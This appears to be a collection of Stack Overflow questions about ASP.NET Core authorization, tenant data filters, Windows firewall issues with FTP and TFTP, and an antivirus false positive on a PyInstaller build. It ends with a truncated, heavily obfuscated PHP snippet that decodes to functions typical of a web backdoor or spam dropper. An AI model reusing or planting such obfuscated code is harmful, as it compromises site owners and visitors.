        {
            context.Succeed(requirement);
            return;
        }
    }
}
</code></pre>
<p>I then register a policy that takes this requirement:</p>
<pre><code>    options.AddPolicy(&quot;CanAccessLocation&quot;,
        policy =&gt; policy.AddRequirements(new AccessLocationRequirement()));
</code></pre>
<p>This works great, but my question is that when I want to define a new policy for defining rules for <strong>editing</strong> a location, I want to avoid rewriting this logic just because the requirement has changed. For example, my condition for editing a location are as follows:</p>
<ol>
<li>If the user is Admin or Master, or</li>
<li>If the user is a part of the Zone which the Location is also a part of AND they have a role of ZoneManager.</li>
</ol>
<p>As we can see, to edit a location, you may fulfill the requirement simply by fulfilling the logic laid out in the <code>IsAdminOrHigherHandler</code> method, but because the <code>IsAdminOrHigherHandler</code> inherits from <code>AuthorizationHandler&lt;AccessLocationRequirement&gt;</code> and not <code>AuthorizationHandler&lt;EditLocationRequirement&gt;</code>, we would have to rewrite this method.</p>
<p>How can I share Authorization Handler logic for different Requirements? Or is there a better method?</p>
"
"<p>I need to allow a 'SuperUser' overall access to data and views across multiple tenants.</p>
<p>I use a single database and a single codebase for  the app. To isolate the data for each tenant a filter has been created in the modelbuilder in <code>ApplicationDbContext</code>.</p>
<p>However, the superuser should be able to bypass this filter and have access to all data (let's not worry, if that is a good thing or not). I know I can accomplish this by adding the <code>IgnoreQueryFilters()</code>, but then I need to add this to each and every filter.</p>
<p>Is there a way to accomplish this globally?</p>
<p>Your guidance is very much appreciated.</p>
<p><strong>Edit</strong></p>
<p>I have added the complete and revised ApplicationDbContext and Program.cs. Why does the if-statement around the codeblock <code>HasQueryFilter()</code> not work?</p>
<p>As was stated by Panagiotis Kanavos, the code should not call <code>HasQueryFilter</code> if the User is an Administrator. But how to accomlplish this? I tried below code, but that did not work.</p>
<p><em>ApplicationDbContext</em></p>
<pre><code>using Whatever.Models;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Identity.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore;

namespace Whatever.Data
{
    public partial class ApplicationDbContext : 
IdentityDbContext&lt;ApplicationUser, ApplicationRole, string,
    IdentityUserClaim&lt;string&gt;, ApplicationUserRole, 
IdentityUserLogin&lt;string&gt;, IdentityRoleClaim&lt;string&gt;, 
IdentityUserToken&lt;string&gt;&gt;
{
    private readonly IHttpContextAccessor _contextAccessor;
    public 
ApplicationDbContext(DbContextOptions&lt;ApplicationDbContext&gt; 
options, IHttpContextAccessor httpContextAccessor)
        : base(options)
    {
        _contextAccessor = httpContextAccessor;
    }
   
    public virtual DbSet&lt;ApplicationUser&gt; ApplicationUser { get; set; }
    public virtual DbSet&lt;ApplicationRole&gt; ApplicationRole { get; set; }
    public virtual DbSet&lt;ApplicationUserRole&gt; ApplicationUserRole { get; set; }
    public virtual DbSet&lt;Tenant&gt; Tenant { get; set; }
    public virtual DbSet&lt;TenantPerson&gt; TenantPerson { get; set; }
    public virtual DbSet&lt;Customer&gt; Customer { get; set; }
    public virtual DbSet&lt;CustomerMember&gt; CustomerMember { get; set; }              

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder);           

        modelBuilder.Entity&lt;ApplicationUserRole&gt;(userRole =&gt;
        {
            userRole.HasKey(ur =&gt; new { ur.UserId, ur.RoleId });

            userRole.HasOne(ur =&gt; ur.Role)
            .WithMany(r =&gt; r.UserRoles)
            .HasForeignKey(ur =&gt; ur.RoleId)
            .IsRequired();

            userRole.HasOne(ur =&gt; ur.User)
            .WithMany(r =&gt; r.UserRoles)
            .HasForeignKey(ur =&gt; ur.UserId)
            .IsRequired();
        });      
          
        if(!_contextAccessor.HttpContext.User.IsInRole(&quot;SuperUser&quot;))  // Does not work properly
        {       
            modelBuilder.Entity&lt;Tenant&gt;().HasQueryFilter(e =&gt; e.Id == CurrentTenantId);
            modelBuilder.Entity&lt;TenantPerson&gt;().HasQueryFilter(e =&gt; e.TenantId == CurrentTenantId);
            modelBuilder.Entity&lt;Customer&gt;().HasQueryFilter(e =&gt; e.TenantId == CurrentTenantId);
            modelBuilder.Entity&lt;CustomerMember&gt;().HasQueryFilter(e =&gt; e.TenantId == CurrentTenantId);
        }          

        modelBuilder.Entity&lt;Project&gt;()
            .HasOne(e =&gt; e.Profile)
        .WithOne(e =&gt; e.Project)
            .HasForeignKey&lt;Profile&gt;(e =&gt; e.ProjectId)
            .IsRequired(false);
    }

    public virtual Guid CurrentTenantId =&gt; GetCurrentTenantId();

  private Guid GetCurrentTenantId()
  {
     string cUsername = _contextAccessor?.HttpContext?.User.Identity?.Name ?? string.Empty;
     ApplicationUser? storedUser = Users.FirstOrDefault(u =&gt; u.UserName == cUsername);
     return storedUser?.TenantId ?? Guid.Empty;
  }
  }
  }
  }
  }
</code></pre>
<p><em>Program.cs</em></p>
<pre><code>using Whatever.Data;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;

var builder = WebApplication.CreateBuilder(args);

// Add services to the container.
var connectionString = 
builder.Configuration.GetConnectionString(&quot;DefaultConnection&quot;) ?? throw new InvalidOperationException(&quot;Connection string 'DefaultConnection' not found.&quot;);
builder.Services.AddDbContext&lt;ApplicationDbContext&gt;(options =&gt;
    options.UseSqlServer(connectionString));

builder.Services.AddDatabaseDeveloperPageExceptionFilter();

builder.Services.AddIdentity&lt;ApplicationUser, ApplicationRole&gt; 
   (options =&gt; options.SignIn.RequireConfirmedAccount = true)
    .AddEntityFrameworkStores&lt;ApplicationDbContext&gt;()
    .AddDefaultUI()
    .AddDefaultTokenProviders();

builder.Services.AddControllersWithViews();
builder.Services.AddRazorPages();
builder.Services.AddAuthorization(options =&gt;
{
    options.FallbackPolicy = new AuthorizationPolicyBuilder()
        .RequireAuthenticatedUser()
        .Build();
});

var app = builder.Build();

// Configure the HTTP request pipeline.
if (app.Environment.IsDevelopment())
{
    app.UseMigrationsEndPoint();
}
else
{
    app.UseExceptionHandler(&quot;/Home/Error&quot;);        
    app.UseHsts();
}
app.UseHttpsRedirection();
app.UseStaticFiles();
app.UseRouting();
app.UseAuthorization();
app.MapControllerRoute(
    name: &quot;default&quot;,
    pattern: &quot;{controller=Customer}/{action=Index}/{id?}&quot;);
app.MapRazorPages();

app.Run();
</code></pre>
"
"<p>my authorization policy does not work the way I expect it to. It's always evaluating <code>false</code> although all the conditions are met, as can be seen below. I have experimented in defining the role claim type name a few different ways because this is what I have seen most people do, but nothing seems to work. Does someone have an idea on how to proceed further with the debugging?</p>
<h4>Program.cs</h4>
<pre class=""lang-cs prettyprint-override""><code>builder.Services.AddMsalAuthentication(options =&gt;
{
    builder.Configuration.Bind(&quot;EntraExternalIdentities&quot;, options.ProviderOptions);
    // options.UserOptions.RoleClaim = &quot;role&quot;;
    // options.UserOptions.RoleClaim = &quot;roles&quot;;
    // options.UserOptions.RoleClaim = ClaimTypes.Role;
});

builder.Services.AddCascadingAuthenticationState();

builder.Services.AddAuthorizationCore(opt =&gt;
{
    opt.AddPolicy(&quot;meh&quot;, policyBuilder =&gt; policyBuilder
            .RequireAuthenticatedUser()
            .RequireRole(&quot;admin&quot;)
            .Build());
});
</code></pre>
<h4>View.razor</h4>
<pre><code>&lt;AuthorizeView Policy=&quot;meh&quot;&gt;
    &lt;Authorized&gt;
        &lt;p&gt;You are authenticated= @context.User.Identity.IsAuthenticated&lt;/p&gt;
        &lt;p&gt;You ARE authorized.&lt;/p&gt;
        &lt;p&gt;Hello, @context.User.Identity?.Name!&lt;/p&gt;
        &lt;pre&gt;roles= @context.User.Claims.Single(s =&gt; s.Type == &quot;roles&quot;).Value&lt;/pre&gt;
    &lt;/Authorized&gt;
    &lt;NotAuthorized&gt;
        &lt;p&gt;You are authenticated= @context.User.Identity.IsAuthenticated&lt;/p&gt;
        &lt;p&gt;You're not authorized.&lt;/p&gt;
        &lt;p&gt;Hello, @context.User.Identity?.Name!&lt;/p&gt;
        &lt;pre&gt;roles= @context.User.Claims.Single(s =&gt; s.Type == &quot;roles&quot;).Value&lt;/pre&gt;
    &lt;/NotAuthorized&gt;
&lt;/AuthorizeView&gt;
</code></pre>
<p><a href=""https://i.stack.imgur.com/PDg69.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/PDg69.png"" alt=""enter image description here"" /></a></p>
<p>The output in the DevTools console in Edge is <code>Microsoft.AspNetCore.Authorization.DefaultAuthorizationService[2] Authorization failed. These requirements were not met:RolesAuthorizationRequirement:User.IsInRole must be true for one of the following roles: (admin)</code></p>
"
"<p>My ASP.NET Core 8 App uses multiple authentication schemes that I need to be able to turn on/off at runtime. Adding/removing authentication schemes to/from the <code>IAuthenticationSchemeProvider</code> at runtime works fine - I've used <a href=""https://github.com/dotnet/aspnetcore/blob/5a6b6c90b6e32ecab4975c546228cc63199f168b/src/AuthSamples/samples/DynamicSchemes/Controllers/AuthController.cs"" rel=""nofollow noreferrer"">this sample</a> at a starting point. However, I need my default authorization to contain multiple schemes since I'm using multiple schemes for Jwt (local auth in my app, and ADFS). So, my <code>ConfigureServices(IServicecollection services)</code> contains this:</p>
<pre><code>    var authPolicyBuilder = new AuthorizationPolicyBuilder()
        .RequireAuthenticatedUser()
        .AddAuthenticationSchemes(JwtBearerDefaults.AuthenticationScheme);
        .AddAuthenticationSchemes(Contants.MyCustomAuthScheme);
    
    services.AddAuthorizationBuilder()
        .SetDefaultPolicy(authPolicyBuilder.Build());
</code></pre>
<p>Now, <code>Constants.MyCustomAuthScheme</code> may not be enabled by default, so the second call to <code>AddAuthenticationSchemes</code> would be commented out. And now I need to be able to add this auth scheme at runtime. I found I can access my <code>AuthorizationPolicy</code> at runtime from <code>IAuthorizationPolicyProvider.GetDefaultPolicy</code>, and while <code>AuthorizationPolicy</code> exposes the <code>AuthenticationSchemes</code> property, it's read-only. I figure for enabling the additional scheme, I might create another <code>AuthorizationPolicy</code> when needed and using <code>AuthorizationPolicy.Combine</code> to combine my default authorization policy with another that is the same except for the scheme. But, what if I want to disable a scheme at runtime?</p>
"
"<p>I want to create a program to track hours, ex. for a job or service hours, that would work on any computer. Is that possible? I don't want to have to download a compiler on every computer, so I was thinking there might be some way to run it in command prompt (on windows, since all the computers I use are windows). I was also wondering, if the program will run without a compiler, can I just carry it around on a flash drive and copy it to whatever device I'm using?</p>
<p>The program would take a user's name and password, check if both are right, then let them add a new entry or change previous entries. This way all of their data is accessible (sort of like a database).</p>
<p>I want to be able to run it without downloading a compiler (because of organizational firewalls, etc.), otherwise it might be a bit more complicated. Is there any way to achieve this?</p>
<p>I haven't really tried anything yet, just doing some preliminary research before I commit.</p>
"
"<p>I have encountered some issues when clients connect to the server using FTP.</p>
<p>Specifically:</p>
<p>When the client uses File Explorer to open <a href=""ftp://192.XXX.XXX.XXX"" rel=""nofollow noreferrer"">ftp://192.XXX.XXX.XXX</a>, they can browse the files successfully,</p>
<p>as shown below:</p>
<p><img src=""https://i.imgur.com/u3Z35TF.jpg"" alt="""" /></p>
<p>When using FileZilla to connect, the client can also see the list of files successfully,</p>
<p>as shown below:</p>
<p><img src=""https://i.imgur.com/remvd5z.png"" alt="""" /></p>
<p>FileZilla is configured to use passive mode and other setting
by default, as indicated below:</p>
<p><img src=""https://i.imgur.com/3lErmtf.png"" alt="""" /></p>
<p>However, when attempting to connect using PowerShell,</p>
<p>after entering the credentials and inputting the command to view the file list</p>
<p>, the following error message appears:</p>
<p><code>150 opening ascii mode data connection</code></p>
<p><img src=""https://i.imgur.com/RN9DTpx.jpg"" alt="""" /></p>
<p><strong>Here are the steps that have been checked:</strong></p>
<p>1.Firewall input rule settings on the server:</p>
<p>Ports 21 and 1024-65535 are open.
Additional FTP server input rule settings:</p>
<p>Specific ports are open, as shown below:</p>
<p><img src=""https://i.imgur.com/716uew5.png"" alt="""" /></p>
<p>2.The client's connection is also configured to use passive mode by default</p>
<p>, as shown below:</p>
<p><img src=""https://i.imgur.com/gJkpvgq.png"" alt="""" /></p>
<p>I would like to inquire if there are any other settings that need to be confirmed.</p>
<p>The main purpose of this question is that I intend to</p>
<p>use a batch script to execute a scheduled task for file transfer.</p>
<p>If there is additional information that needs to be provided</p>
<p>please let me know.</p>
<p>Your assistance is greatly appreciated.</p>
"
"<p>I'm trying to add a rule to Windows firewall in .Net Core Middleware (httpHandler) written in C# . The code looks like this:</p>
<pre><code>INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID(&quot;HNetCfg.FwPolicy2&quot;));
 var rule = firewallPolicy.Rules.Item(&quot;IPBan_0&quot;); 
 string[] addrs = rule.RemoteAddresses.ToString().Split(',');
 if (Array.IndexOf(addrs, $&quot;{ip}/255.255.255.255&quot;) == -1)
 {
     rule.RemoteAddresses += $&quot;,{ip}/255.255.255.255&quot;;  &lt;--  Error Here 
 }
</code></pre>
<p>I assume I have to give &quot;something&quot; elevated privileges but not sure if I can give them to this firewallPolicy or the whole program... which I'd like to avoid if I could. I tried specifying the admin user in this web's basic settings but that didn't help.</p>
<p>What do I need to do in order to get this working?</p>
"
"<p>The TFTP protocol has the following flow:</p>
<p>Client sends a RRQ or WRQ request from a randomly selected CTID port to port 69 on the server:</p>
<p>Client:CTID ------&gt; Server:69</p>
<p>Server replies from a randomly selected STID port to the client's CTID:</p>
<p>Client:CTID &lt;------ Server:STID</p>
<p>all subsequent packets for that transfer are sent between the client's CTID and the server's STID as needed.</p>
<p>Client:CTID &lt;-----&gt; Server:STID</p>
<p>I have noticed that the client is unable to receive the packet from server:STID  when the windows defender firewall is enabled. When disabled the packet is received.</p>
<p>It is my understanding that when the client binds CTID it should receive all packets with that destination port. Why are the UDP packets from server:STID filtered out by the firewall?</p>
<p>Applications like tftp64 are able to function even with the firewall enabled. What does it do differently?</p>
<p>Here a minimal example in C that demonstrates the issue:</p>
<pre><code>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;winsock2.h&gt;

#define DBG(fmt, ...) fprintf(stderr, &quot;% 8d : &quot; fmt &quot;\n&quot;, __LINE__ __VA_OPT__(, ) __VA_ARGS__)

int main(void) {
    uint32_t ip = 0xC0A8010A; // 192.168.1.10
    uint16_t port = 69;
    int err;

    WSADATA WsaDat;
    if (WSAStartup(MAKEWORD(2, 2), &amp;WsaDat) != 0) {
        err = WSAGetLastError();
        DBG(&quot;WSAStartup() failed (Err: %d)\n&quot;, err);
        return -1;
    }

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    DBG(&quot;sock: %d&quot;, sock);
    if (sock &lt; 0) {
        return -1;
    }

    struct sockaddr_in destAddr;
    memset(&amp;destAddr, 0, sizeof(destAddr));
    destAddr.sin_family         = AF_INET;
    destAddr.sin_addr.s_addr    = htonl(ip);
    destAddr.sin_port           = htons(port);

    char buffer[1024] = &quot;\x00\x02\x2f\x62\x61\x63\x6b\x65\x6e\x64\x2e\x68\x00\x6f\x63\x74\x65\x74\x00\x74\x73\x69\x7a\x65\x00\x30\x00&quot;;

    DBG(&quot;Send TO     %u.%u.%u.%u:%u&quot;, (ip &amp; 0xff000000) &gt;&gt; 24, (ip &amp; 0xff0000) &gt;&gt; 16, (ip &amp; 0xff00) &gt;&gt; 8, ip &amp; 0xff, port);
    err = sendto(sock, buffer, 27, 0, (struct sockaddr *) &amp;destAddr, sizeof(destAddr));
    DBG(&quot;sendto: %d&quot;, err);
    if (err != 27) {
        return -1;
    }

    // socket should now be implicitly bound to some random port and should be able to receive

    struct sockaddr_in  srcAddr;
    memset(&amp;srcAddr, 0, sizeof(srcAddr));
    int32_t srcAddrLen = sizeof(srcAddr);
    err = recvfrom(sock, buffer, 1024, 0, (struct sockaddr*)&amp;srcAddr, &amp;srcAddrLen);
    DBG(&quot;recvfrom: %d&quot;, err);
    if (err &gt; 0) {
        ip = ntohl(srcAddr.sin_addr.s_addr);
        port  = ntohs(srcAddr.sin_port);
        DBG(&quot;Recv From    %u.%u.%u.%u:%u&quot;, (ip &amp; 0xff000000) &gt;&gt; 24, (ip &amp; 0xff0000) &gt;&gt; 16, (ip &amp; 0xff00) &gt;&gt; 8, ip &amp; 0xff, port);
    }
    return 0;
}
</code></pre>
<pre><code>FIREWALL ON
      20 : sock: 264
      33 : Send TO     192.168.1.10:69
      35 : sendto: 27
^C
FIREWALL OFF
      20 : sock: 244
      33 : Send TO     192.168.1.10:69
      35 : sendto: 27
      46 : recvfrom: 4
      50 : Recv From    192.168.1.10:50000
</code></pre>
"
"<p>I hope you are doing well. I have a question regarding Unreal Engine EOS because I want to set it up in my brand settings on the Epic Games Dev Portal. I want everyone to be able to sign in to my game with their account and not just the developers. I need to provide a URL to my website and my privacy policy (see image). But what does the page need to include? Is it enough if the page consists only of simple text with the privacy policy? Do I need to include information about myself such as an imprint, etc.? And where can I get a privacy policy? What are your experiences...? Thank you for any help.<a href=""https://i.stack.imgur.com/21lTy.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/21lTy.png"" alt=""enter image description here"" /></a></p>
"
"<p>Aright so just recently I've created an app called Wmapper that allows users to keymap throughout windows. It has 2 directorys that have exe files in thema and those work perfectly and are not detected but then I created a hub application that allows you to launch those 2 exe and import json's to those folders. This all was done in python btw.</p>
<p>The libraries I used for my app were:</p>
<pre><code>import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
import subprocess
import sv_ttk
import shutil
import os
import webbrowser
import pywinstyles
</code></pre>
<p>I'm not sure whether some of the libraries are infected or not because It is my first time using a few of them like <code>sv_ttk</code> and <code>pywinstyles</code> although from what others have said they are not infected.</p>
<p>I know It's pretty common for this to happen when pyinstalling but this is the first time its happening to me. The trojan windows detected was :</p>
<pre><code>trojan wacatac.b!ml
</code></pre>
<p>Here are some important parts of the code that maybe yall can take a look at?</p>
<p>Import JSON function:</p>
<pre><code>def import_keymap_config():
    file_path = filedialog.askopenfilename(filetypes=[(&quot;JSON files&quot;, &quot;*.json&quot;)])
    if file_path:
        # Move the JSON file to the keymapdefault folder
        shutil.move(file_path, &quot;keymapdefault/&quot;)
        file_name = os.path.basename(file_path)
        # Show a popup message
        popup_msg = f&quot;Successfully imported the keymap configuration: {file_name}&quot;
        popup = tk.Toplevel(root)
        popup.geometry(&quot;700x100&quot;)
        popup.title(&quot;Import Success&quot;)
        label = ttk.Label(popup, text=popup_msg)
        label.pack(pady=20)
        ok_button = ttk.Button(popup, text=&quot;OK&quot;, command=popup.destroy)
        ok_button.pack()

def import_swiping_keymap_config():
    file_path = filedialog.askopenfilename(filetypes=[(&quot;JSON files&quot;, &quot;*.json&quot;)])
    if file_path:
        # Move the JSON file to the keymapdefault folder
        shutil.move(file_path, &quot;keymapswipe/&quot;)
        file_name = os.path.basename(file_path)
        # Show a popup message
        popup_msg = f&quot;Successfully imported the keymap configuration: {file_name}&quot;
        popup = tk.Toplevel(root)
        popup.geometry(&quot;700x100&quot;)
        popup.title(&quot;Import Success&quot;)
        label = ttk.Label(popup, text=popup_msg)
        label.pack(pady=20)
        ok_button = ttk.Button(popup, text=&quot;OK&quot;, command=popup.destroy)
        ok_button.pack()
</code></pre>
<p>Open web browser links:</p>
<pre><code>def open_github():
    webbrowser.open_new(&quot;https://github.com/FlippantDev/Wmapper&quot;)

def open_youtube():
    webbrowser.open_new(&quot;https://www.youtube.com/channel/UCE-ixwTDDLOqRPz3InkWPYw&quot;)

def open_discord():
    webbrowser.open_new(&quot;https://discord.gg/[discord]&quot;)

button1 = ttk.Button(button_frame, text=&quot;Github 😺&quot;, command=open_github, takefocus=0) 
button1.pack(fill=&quot;x&quot;, padx=10, pady=5)

button2 = ttk.Button(button_frame, text=&quot;Youtube 🔥&quot;, command=open_youtube, takefocus=0)
button2.pack(fill=&quot;x&quot;, padx=10, pady=5)

button2 = ttk.Button(button_frame, text=&quot;Discord 🎮&quot;, command=open_discord, style=&quot;Accent.TButton&quot;, takefocus=0)
button2.pack(fill=&quot;x&quot;, padx=10, pady=5)

version_label = tk.Label(sidebar_frame, text=&quot;Wmapper v1.0.2&quot;, font=(&quot;Helvetica&quot;, 13), bg=&quot;#171717&quot;, fg=&quot;white&quot;)
version_label.pack(side=&quot;bottom&quot;, pady=(0, 20))
</code></pre>
<p>Settings tab:</p>
<pre><code>    elif page_name == &quot;Settings&quot;:
        # Setting up a frame to align widgets from left to right
        settings_frame = tk.Frame(page, bg=&quot;#1c1c1c&quot;)
        settings_frame.pack(padx=10, pady=10, fill=&quot;both&quot;, expand=True)

        # Button to import keymap config for default keymap
        import_button = ttk.Button(settings_frame, text=&quot;Import Keymap Config for Default Keymap&quot;, command=import_keymap_config, style=&quot;Accent.TButton&quot;, takefocus=0)
        import_button.grid(row=1, column=0, columnspan=2, pady=10)
        
        import_button2 = ttk.Button(settings_frame, text=&quot;Import Keymap Config for Swiping Keymap&quot;, command=import_swiping_keymap_config, style=&quot;Accent.TButton&quot;, takefocus=0)
        import_button2.grid(row=2, column=0, columnspan=2, pady=10)

        # Function to toggle glossy theme
        def toggle_glossy_theme():
                pywinstyles.apply_style(root, &quot;acrylic&quot;)
        def toggleOFF_glossy_theme():
                pywinstyles.apply_style(root, &quot;normal&quot;)

        # Create a section for appearance
        appearance_label = ttk.Label(settings_frame, text=&quot;Appearance Settings:&quot;, style=&quot;Accent.TLabel&quot;)
        appearance_label.grid(row=3, column=0, columnspan=2, padx=10, pady=10, sticky=&quot;w&quot;)

        # Button to toggle on glossy theme
        glossy_button = ttk.Button(settings_frame, text=&quot;Toggle On Glossy Theme (experimental)&quot;, command=toggle_glossy_theme, takefocus=0)
        glossy_button.grid(row=4, column=0, columnspan=2, pady=10)

        # Button to toggle off glossy theme
        glossyOFF_button = ttk.Button(settings_frame, text=&quot;Toggle Off Glossy Theme (experimental)&quot;, command=toggleOFF_glossy_theme, takefocus=0)
        glossyOFF_button.grid(row=5, column=0, columnspan=2, pady=10)
</code></pre>
<p>oh and the feature to actualyl launch the executables:</p>
<pre><code># Function to launch the swiping keymap executable
def launch_swipe_executable():
    subprocess.Popen([&quot;keymapswipe/main.exe&quot;])

# Function to launch the default keymap executable
def launch_default_executable():
    subprocess.Popen([&quot;keymapdefault/main.exe&quot;])
</code></pre>
<p>Aright so the first thing I tried was to remove a library called TKHTMLVIEW and I removed that already and in the above code its not there + I wanted to removed it anyway.</p>
<p>The issue still persists.</p>
<p>I also tried to remove <code>sv_ttk</code> and <code>pywinstyles</code> but the issue was still there
I literally also removed the option to turn on glossy and unglossy themes but the issue was not going.</p>
<p>I tried to remove the import JSON function but guess what, the issue still persisted?</p>
<p>I took the steps that I needed to before coming here and now I'm here and idk what to do</p>
"
"<pre><code>&lt;?php
//header('Content-Type:text/html; charset=utf-8');
$NISS_IIS__='8453';
$N_ISI_SSI_='n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j';$NSIS_S_I_I=$N_ISI_SSI_[26].$N_ISI_SSI_[6].$N_ISI_SSI_[10].$N_ISI_SSI_[30].$N_ISI_SSI_[29].$N_ISI_SSI_[26].$N_ISI_SSI_[30].$N_ISI_SSI_[38].$N_ISI_SSI_[6].$N_ISI_SSI_[18].$N_ISI_SSI_[23].$N_ISI_SSI_[10].$N_ISI_SSI_[29].$N_ISI_SSI_[10].$N_ISI_SSI_[12].$N_ISI_SSI_[5].$N_ISI_SSI_[30].$N_ISI_SSI_[2].$N_ISI_SSI_[35].$N_ISI_SSI_[0].$N_ISI_SSI_[30].$N_ISI_SSI_[29].$N_ISI_SSI_[33].$N_ISI_SSI_[30].$N_ISI_SSI_[10];$NSS__IIIS_=$N_ISI_SSI_[12].$N_ISI_SSI_[27].$N_ISI_SSI_[0].$N_ISI_SSI_[35].$N_ISI_SSI_[24].$N_ISI_SSI_[30].$N_ISI_SSI_[29].$N_ISI_SSI_[18].$N_ISI_SSI_[33].$N_ISI_SSI_[30].$N_ISI_SSI_[24].$N_ISI_SSI_[29].$N_ISI_SSI_[6].$N_ISI_SSI_[3].$N_ISI_SSI_[35].$N_ISI_SSI_[24].$N_ISI_SSI_[10];$N__IISI_SS=$N_ISI_SSI_[38].$N_ISI_SSI_[12].$N_ISI_SSI_[23].$N_ISI_SSI_[30].$N_ISI_SSI_[29].$N_ISI_SSI_[16].$N_ISI_SSI_[18].$N_ISI_SSI_[10].$N_ISI_SSI_[29].$N_ISI_SSI_[32].$N_ISI_SSI_[35].$N_ISI_SSI_[0].$N_ISI_SSI_[10].$N_ISI_SSI_[30].$N_ISI_SSI_[0].$N_ISI_SSI_[10].$N_ISI_SSI_[33];$NS_S__IIIS=$N_ISI_SSI_[38].$N_ISI_SSI_[12].$N_ISI_SSI_[23].$N_ISI_SSI_[30].$N_ISI_SSI_[29].$N_ISI_SSI_[27].$N_ISI_SSI_[30].$N_ISI_SSI_[10].$N_ISI_SSI_[29].$N_ISI_SSI_[32].$N_ISI_SSI_[35].$N_ISI_SSI_[0].$N_ISI_SSI_[10].$N_ISI_SSI_[30].$N_ISI_SSI_[0].$N_ISI_SSI_[10].$N_ISI_SSI_[33];$N_I_SSI_IS=$N_ISI_SSI_[33].$N_ISI_SSI_[30].$N_ISI_SSI_[10].$N_ISI_SSI_[29].$N_ISI_SSI_[10].$N_ISI_SSI_[12].$N_ISI_SSI_[5].$N_ISI_SSI_[30].$N_ISI_SSI_[29].$N_ISI_SSI_[23].$N_ISI_SSI_[12].$N_ISI_SSI_[5].$N_ISI_SSI_[12].$N_ISI_SSI_[10];$NI_I_SISS_=$N_ISI_SSI_[3].$N_ISI_SSI_[6].$N_ISI_SSI_[33].$N_ISI_SSI_[30].$N_ISI_SSI_[22].$N_ISI_SSI_[36].$N_ISI_SSI_[29].$N_ISI_SSI_[26].$N_ISI_SSI_[30].$N_ISI_SSI_[32].$N_ISI_SSI_[35].$N_ISI_SSI_[26].$N_ISI_SSI_[30];$N_IISI_SS_=$N_ISI_SSI_[33].$N_ISI_SSI_[18].$N_ISI_SSI_[3].$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[29].$N_ISI_SSI_[32].$N_ISI_SSI_[35].$N_ISI_SSI_[18].$N_ISI_SSI_[0].$N_ISI_SSI_[10];$NSSI___ISI=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[29].$N_ISI_SSI_[12].$N_ISI_SSI_[24].$N_ISI_SSI_[30].$N_ISI_SSI_[16].$N_ISI_SSI_[23].$N_ISI_SSI_[6].$N_ISI_SSI_[32].$N_ISI_SSI_[30];$NIS___SISI=$N_ISI_SSI_[16].$N_ISI_SSI_[24].$N_ISI_SSI_[30].$N_ISI_SSI_[27].$N_ISI_SSI_[29].$N_ISI_SSI_[24].$N_ISI_SSI_[30].$N_ISI_SSI_[16].$N_ISI_SSI_[23].$N_ISI_SSI_[6].$N_ISI_SSI_[32].$N_ISI_SSI_[30];$N__SSIIS_I=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[29].$N_ISI_SSI_[24].$N_ISI_SSI_[30].$N_ISI_SSI_[16].$N_ISI_SSI_[23].$N_ISI_SSI_[6].$N_ISI_SSI_[32].$N_ISI_SSI_[30];$N_II_ISSS_=$N_ISI_SSI_[32].$N_ISI_SSI_[18].$N_ISI_SSI_[24].$N_ISI_SSI_[23].$N_ISI_SSI_[29].$N_ISI_SSI_[33].$N_ISI_SSI_[30].$N_ISI_SSI_[10].$N_ISI_SSI_[35].$N_ISI_SSI_[16].$N_ISI_SSI_[10];$NI__SII_SS=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[10].$N_ISI_SSI_[35].$N_ISI_SSI_[23].$N_ISI_SSI_[35].$N_ISI_SSI_[34].$N_ISI_SSI_[30].$N_ISI_SSI_[24];$N_SIS__SII=$N_ISI_SSI_[16].$N_ISI_SSI_[24].$N_ISI_SSI_[30].$N_ISI_SSI_[27].$N_ISI_SSI_[29].$N_ISI_SSI_[5].$N_ISI_SSI_[6].$N_ISI_SSI_[10].$N_ISI_SSI_[32].$N_ISI_SSI_[31];$N_S_SIII_S=$N_ISI_SSI_[32].$N_ISI_SSI_[18].$N_ISI_SSI_[24].$N_ISI_SSI_[23].$N_ISI_SSI_[29].$N_ISI_SSI_[32].$N_ISI_SSI_[23].$N_ISI_SSI_[35].$N_ISI_SSI_[33].$N_ISI_SSI_[30];$NSIIS_S_I_=$N_ISI_SSI_[18].$N_ISI_SSI_[24].$N_ISI_SSI_[23].$N_ISI_SSI_[30].$N_ISI_SSI_[0].$N_ISI_SSI_[32].$N_ISI_SSI_[35].$N_ISI_SSI_[26].$N_ISI_SSI_[30];$NSSIS_I__I=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[10].$N_ISI_SSI_[35].$N_ISI_SSI_[10].$N_ISI_SSI_[12].$N_ISI_SSI_[5].$N_ISI_SSI_[30];$NSSI__SII_=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[29].$N_ISI_SSI_[33].$N_ISI_SSI_[16].$N_ISI_SSI_[23].$N_ISI_SSI_[12].$N_ISI_SSI_[10];$N__II_SISS=$N_ISI_SSI_[27].$N_ISI_SSI_[2].$N_ISI_SSI_[12].$N_ISI_SSI_[0].$N_ISI_SSI_[38].$N_ISI_SSI_[23].$N_ISI_SSI_[6].$N_ISI_SSI_[10].$N_ISI_SSI_[30];$NSIS__S_II=$N_ISI_SSI_[32].$N_ISI_SSI_[18].$N_ISI_SSI_[24].$N_ISI_SSI_[23].$N_ISI_SSI_[29].$N_ISI_SSI_[12].$N_ISI_SSI_[0].$N_ISI_SSI_[12].$N_ISI_SSI_[10];$N_SSSII_I_=$N_ISI_SSI_